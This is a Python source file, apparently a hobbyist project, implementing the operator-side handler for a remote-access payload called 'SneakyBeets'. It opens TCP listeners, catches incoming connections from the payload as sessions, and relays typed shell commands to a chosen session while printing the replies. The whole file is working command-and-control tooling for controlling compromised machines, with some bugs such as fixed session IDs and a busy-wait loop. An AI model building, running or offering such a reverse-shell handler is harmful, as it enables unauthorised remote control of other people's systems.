#This is a python version of the handler

#!/usr/bin/env python3

import socket
import os
import threading
from art import text2art

#cool intro stuff
awesome = text2art("SneakyBeets")

print(awesome)
print("This is a handler for the one and only SneakyBeets payload")
print("Written by Jarod Keene\n")


HOST = '127.0.0.1'	# Standard loopback interface address (localhost)
PORT = 1234			# Port to listen on (non-privileged ports are > 1023)

SESSIONID = 0		# this will hold the next session id available
LISTENERID = 0		# this will hold the next listener id

sessions = []
listeners = []

class listenerClass:
	listening_port = 1234
	listener_id = 0

class sessionClass:
	socket = 0
	session_id = 0
	local_port = 0
	remote_port = 0
	remote_ip = 0


def main():
	while 1:
		command = getCommand()

		#commands = command.trim()
		commands = command.split(" ")

		if commands[0] == "listener":
			if len(commands) > 1:
				try:
					lisPort = int(commands[1])
				except:
					print("Integer required")
					continue

				thread = threading.Thread(target=listener, args=(lisPort,))
				thread.daemon = True
				thread.start()

			else:
				print("Usage: listener <port>")
		
		elif commands[0] == "default":
			listener(PORT)

		elif commands[0] == "listeners":
			#this code will be implemented at a later time when listeners are multithreaded
			print("Listeners:\n")
			for lis in listeners:
				print("Listener ID: " + str(lis.listener_id) + "   Listening Port: " + str(lis.listening_port))
			print("")

		elif commands[0] == "sessions":
			#this code will be implemented at a later time when sessions are multithreaded
			print("Sessions:\n")
			for sesh in sessions:
				print("Session ID: " + str(sesh.session_id) + "  Remote IP: " + str(sesh.remote_ip))
			print("")

		elif commands[0] == "session":
			try:
				sid = int(commands[1])
			except:
				print("Usage: session <sid>")
				continue
			interact(int(commands[1]))


		elif commands[0] == "help": #this will open the help menu txt file and print it out
			f = open("help.txt", 'r')
			menu = f.read()
			print('\n' + menu +'\n')
			f.close() #close the open file

		elif commands[0] == "clear":
			os.system('cls')

		
		elif commands[0] == "exit":
			print("Exiting...")
			return
		else:
			print("Bad Input.")


def getCommand():
	c = ""

	while not c:
	   c = input("SneakyBeets> ")

	return c

def interact(sid):
	#interact with a given session passing in a session id
	for sesh in sessions:
		if sesh.session_id == sid:
			curr = sesh
			break

	cont = 1
	while cont:
		data = "a"
		command = input("Handler-> ")
		command += '\n'

		if command == '\n':
			continue

		curr.socket.sendall(command.encode())

		#leave conditions
		if command == "exit\n":
			cont = 0
		if not data:
			cont = 0

		data = curr.socket.recv(2048)
		print(data.decode())

def listener(port):
	if port < 1024 or port > 65535:
		print("INVALID PORT")
		return
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		print("Starting listener....\n")
		s.bind((HOST, port))
		#print("Socket bind complete") debugging purposes

		s.listen()
		print("Listening on port " + str(port))

		# add a new listener to the listener list
		newlist = listenerClass()
		newlist.listener_id = 1
		newlist.listening_port = str(port)
		listeners.append(newlist)

		conn, addr = s.accept()
		with conn:
			print('New session opened:')
			print('Connected by ' + addr[0] + ':' + str(addr[1]))
			#initial connection stuff
			#data = conn.recv(2048)
			#print(data.decode())

			newsesh = sessionClass()

			newsesh.socket = conn
			
			newsesh.session_id = 1

			newsesh.local_port = port
			newsesh.remote_port = str(addr[1])
			newsesh.remote_ip = addr[0]


			sessions.append(newsesh)

			#continue case
			while conn:
				pass				

if __name__ == '__main__':
	main()
